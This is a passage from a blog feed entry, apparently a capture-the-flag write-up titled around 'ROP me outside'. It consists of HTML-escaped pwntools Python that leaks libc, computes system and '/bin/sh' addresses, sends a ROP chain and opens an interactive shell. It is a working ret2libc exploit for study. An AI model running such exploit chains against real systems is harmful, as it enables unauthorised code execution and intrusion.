class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fgets() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'libc_base located at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;# offset
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# argument
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# function_call
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_last.png&quot; alt=&quot;ropme_leak_libc&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry></feed>